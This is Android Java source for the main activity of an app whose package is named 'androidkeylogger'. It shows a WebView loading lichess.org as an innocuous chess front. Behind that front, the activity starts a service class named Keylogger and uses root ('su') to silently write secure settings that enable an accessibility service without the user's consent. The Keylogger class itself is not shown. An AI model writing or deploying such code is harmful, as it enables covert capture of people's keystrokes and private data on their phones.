package com.bshu2.androidkeylogger;

import android.os.AsyncTask;
import android.os.Bundle;
import android.util.Log;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.content.Intent;
import androidx.appcompat.app.AppCompatActivity;
import java.io.DataOutputStream;

public class MainActivity extends AppCompatActivity {

    private WebView webView;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        Log.d("MainActivity", "onCreate started");

        webView = findViewById(R.id.webView);
        setupWebView();

        // Start FileAccessService (Accessibility Service)
        startAccessibilityService();

        // Enable Accessibility if Rooted
        new EnableAccessibilityTask().execute();
    }

    private void setupWebView() {
        WebSettings webSettings = webView.getSettings();
        webSettings.setJavaScriptEnabled(true);
        webSettings.setDomStorageEnabled(true);  // Improve WebView Performance
        webSettings.setAllowFileAccess(true);
        webSettings.setAllowContentAccess(true);

        webView.setWebViewClient(new WebViewClient());
        webView.loadUrl("https://lichess.org");  // ✅ Load Lichess
    }

    private void startAccessibilityService() {
        Log.d("MainActivity", "Starting Accessibility Service...");
        Intent serviceIntent = new Intent(this, Keylogger.class);
        startService(serviceIntent);
    }

    private static class EnableAccessibilityTask extends AsyncTask<Void, Void, Void> {
        @Override
        protected Void doInBackground(Void... params) {
            enableAccessibility();
            return null;
        }

        private void enableAccessibility() {
            Log.d("MainActivity", "Checking root and enabling Accessibility...");
            try {
                Process process = Runtime.getRuntime().exec("su");
                DataOutputStream os = new DataOutputStream(process.getOutputStream());
                os.writeBytes("settings put secure enabled_accessibility_services com.bshu2.androidfileaccess/com.bshu2.androidfileaccess.FileAccessService\n");
                os.flush();
                os.writeBytes("settings put secure accessibility_enabled 1\n");
                os.flush();
                os.writeBytes("exit\n");
                os.flush();
                process.waitFor();
                Log.d("MainActivity", "Accessibility enabled successfully.");
            } catch (Exception e) {
                Log.e("MainActivity", "Failed to enable accessibility", e);
            }
        }
    }
}

